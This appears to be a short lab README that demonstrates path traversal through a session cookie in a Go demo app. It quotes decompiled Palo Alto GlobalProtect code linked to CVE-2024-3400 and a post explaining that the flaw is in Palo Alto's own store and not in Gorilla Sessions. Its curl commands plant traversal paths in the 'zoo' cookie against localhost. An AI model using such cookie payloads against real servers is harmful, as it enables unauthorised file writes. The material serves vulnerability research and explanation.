# A Gorilla Session Vulnerable to Path Directory Traversal

```
export SESSION_KEY=gorilla
```

```
go run escapezoo.go
```

# Path Directory Traversal

```
curl --cookie "zoo=$PREFIX/tmp" http://localhost:8080
```

```
curl --cookie "zoo=$HOME/" http://localhost:8080
```

# Palo Alto Global Protect CVE-2024-3400 related vulnerability

```
if ( os_IsNotExist(fmta._r2) )
      {
        store_8b = (github_com_gorilla_sessions_Store_0)net_http__ptr_Request_Context(r);
        ctxb = store_8b.tab;
        v52 = runtime_convTstring((string)s->path);
        v6 = (_1_interface_ *)runtime_newobject((runtime__type_0 *)&RTYPE__1_interface_);
        v51 = (interface__0 *)v6;
        (*v6)[0].tab = (void *)&RTYPE_string_0;
        if ( *(_DWORD *)&runtime_writeBarrier.enabled )
          runtime_gcWriteBarrier();
        else
          (*v6)[0].data = v52;
        storee.tab = ctxb;
        storee.data = store_8b.data;
        fmtb.str = (uint8 *)"folder is missing, create folder %s";
        fmtb.len = 35LL;
        fmt_16a.array = v51;
        fmt_16a.len = 1LL;
        fmt_16a.cap = 1LL;
        paloaltonetworks_com_libs_common_Warn(storee, fmtb, fmt_16a);
        err_1 = os_MkdirAll((string)s->path, 0644u);
```

https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/

# A Justification on SESSID implemented on Palo Alto

```
A PSA since there's some confusion on this...

There is no vulnerability in Gorilla Sessions.

The vulnerability is in Palo Alto's internal SessDiskStore, which looks similar to FilesystemStore. Early analysis came to the mistaken conclusion that the vulnerable path was in FilesystemStore, but it's not. FilesystemStore authenticates the Session.ID with securecookie, SessDiskStore does not.

Hypothetically, if an application went out of their way to misuse FilesystemStore by not using its New API and stuffing attacker-controlled data in Session.ID (which is documented as not being safe), they could hit this.

That's *not* what happened to Palo Alto. They wrote their own Store that takes the session ID from a cookie in New without authentication.
```

https://abyssdomain.expert/@filippo/112289039356637058
